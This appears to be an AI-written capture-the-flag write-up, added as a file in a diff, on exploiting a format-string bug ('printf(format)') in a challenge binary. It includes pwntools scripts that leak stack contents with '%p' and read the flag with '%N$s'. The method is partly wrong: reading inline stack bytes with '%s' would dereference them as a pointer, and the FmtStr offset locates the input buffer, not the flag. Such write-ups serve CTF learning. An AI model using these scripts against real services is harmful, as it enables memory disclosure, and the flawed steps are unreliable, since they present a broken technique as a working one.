@@ -1,0 +1,185 @@
+To solve this challenge using pwntools, we'll exploit the format string vulnerability present in the program to leak the flag from memory. Here's a step-by-step guide along with the code to achieve this:
+
+### **Step 1: Analyze the Vulnerability**
+
+From the provided decompiled code, we can observe the following:
+
+- The program reads the flag from `flag.txt` into the buffer `v10[24]`.
+- It prompts the user for input using `scanf("%ms", &format);`, which allocates a buffer for the input string.
+- If the input does not match the flag, it prints the user's input back using `printf(format);`.
+
+This line `printf(format);` is vulnerable to a format string attack because it uses the user's input directly as the format string without any validation or formatting.
+
+### **Step 2: Exploit the Format String Vulnerability**
+
+Our goal is to use the format string vulnerability to read the flag from the stack. We'll proceed by:
+
+1. **Finding the Correct Offset**: Determine the number of stack positions between our format string and the flag. We can do this by sending payloads that print stack values and observing where the flag appears.
+2. **Crafting the Payload**: Once we know the correct offset, we'll craft a payload that uses `%<offset>$s` to print the flag.
+
+### **Step 3: Write the Exploit Using pwntools**
+
+Below is the exploit script using pwntools:
+
+```python
+from pwn import *
+
+# Adjust context settings (if necessary)
+context(os='linux', arch='amd64')
+
+# Start the process or connect to remote service
+# For local testing
+p = process('./fmt')
+
+# For remote connection (uncomment and modify the address and port)
+# p = remote('challenge_server_address', 1234)
+
+# Receive the initial prompt
+p.recvuntil("what's the flag\n")
+
+# **Step 1: Find the Correct Offset**
+
+# Send a payload to print stack pointers
+payload = ''.join([' %p'] * 50)  # Adjust the number as needed
+p.sendline(payload)
+
+# Receive and process the output
+output = p.recv()
+
+# Print the output to analyze
+print("Output from the program:")
+print(output.decode())
+
+# **Manual Analysis Required Here**
+
+# From the output, identify which stack position contains the flag.
+# Suppose we find that the flag appears at the position corresponding to %14$p.
+
+# **Step 2: Craft the Payload to Print the Flag**
+
+# Now, we'll attempt to print the flag directly using %14$s (adjust the offset based on your findings)
+offset = 14  # Replace with the correct offset found from analysis
+payload = f'%{offset}$s'
+
+# Send the payload
+p.sendline(payload)
+
+# Receive and print the flag
+flag = p.recv()
+
+print("Flag:")
+print(flag.decode())
+
+# Close the process
+p.close()
+```
+
+### **Explanation of the Exploit Script**
+
+1. **Starting the Process**: We start the vulnerable program or connect to it remotely.
+   
+   ```python
+   p = process('./fmt')
+   ```
+   
+2. **Interacting with the Program**: We wait for the prompt asking for the flag.
+
+   ```python
+   p.recvuntil("what's the flag\n")
+   ```
+
+3. **Finding the Correct Offset**:
+
+   - We send a payload that prints multiple stack values.
+
+     ```python
+     payload = ''.join([' %p'] * 50)
+     p.sendline(payload)
+     ```
+
+   - We receive the output and analyze it to find where the flag is located.
+
+     ```python
+     output = p.recv()
+     print(output.decode())
+     ```
+
+   - **Manual Analysis**: Look through the printed pointers to find the flag. It might appear as readable ASCII characters.
+
+4. **Crafting the Payload to Print the Flag**:
+
+   - Once we've identified the correct offset (say, `%14$p`), we use `%14$s` to print the flag as a string.
+
+     ```python
+     offset = 14  # Replace with actual offset
+     payload = f'%{offset}$s'
+     p.sendline(payload)
+     ```
+
+5. **Retrieving the Flag**:
+
+   - We receive the output from the program, which should now include the flag.
+
+     ```python
+     flag = p.recv()
+     print("Flag:")
+     print(flag.decode())
+     ```
+
+6. **Clean Up**:
+
+   - Close the connection to the process.
+
+     ```python
+     p.close()
+     ```
+
+### **Notes and Tips**
+
+- **Adjust the Offset**: The offset may vary depending on the system and the environment. Make sure to adjust the offset based on your analysis of the output.
+- **Endianness and Encoding**: When analyzing the output, keep in mind the endianness and encoding. The flag may appear in reversed order or may need decoding.
+- **Automating Offset Discovery**: You can automate the offset discovery using pwntools' `FmtStr` class or by parsing the output more systematically.
+
+### **Alternative Method: Automating with FmtStr**
+
+Pwntools provides utilities to automate format string exploitation. Here's how you can use `FmtStr` to find the offset:
+
+```python
+from pwn import *
+
+# Start the process
+p = process('./fmt')
+
+# Wait for the prompt
+p.recvuntil("what's the flag\n")
+
+# Define how to send and receive data
+def send_payload(payload):
+    p.sendline(payload)
+    return p.recv()
+
+# Use FmtStr to find the offset
+fmt = FmtStr(execute_fmt=send_payload)
+
+# Get the offset value
+offset = fmt.offset
+print(f"Found format string offset: {offset}")
+
+# Craft the payload to leak the flag
+payload = f'%{offset}$s'
+p.sendline(payload)
+
+# Receive and print the flag
+flag = p.recv()
+print("Flag:")
+print(flag.decode())
+
+# Close the process
+p.close()
+```
+
+### **Conclusion**
+
+By exploiting the format string vulnerability and carefully crafting our payload, we can successfully read the flag from the program's memory. The key steps are identifying the vulnerability, finding the correct stack offset, and using the appropriate format specifiers to leak the desired information.
+
+**Remember to use this knowledge ethically and within legal boundaries, such as in controlled environments like CTF competitions or with explicit permission.**
